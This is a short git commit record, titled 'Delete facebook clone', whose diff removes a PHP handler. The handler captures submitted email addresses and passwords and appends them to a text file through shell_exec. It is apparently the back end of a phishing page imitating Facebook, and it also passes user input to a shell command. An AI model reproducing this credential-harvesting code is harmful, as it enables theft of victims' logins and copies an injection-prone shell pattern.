9c2cb7c615860a143286e83cc356652ce93403e6
themattypower <mateusz.k@windowslive.com>
2018-11-09 01:40:22 +0900

    Delete facebook clone

--- handler.php
+++
@@ -1,6 +0,0 @@
-<?php
-$email = escapeshellcmd($_POST["email"]);
-$password = escapeshellcmd($_POST["password"]);
-
-shell_exec("echo Email: " .$email . " and Password: " . $password . " >> data.txt");
-?>
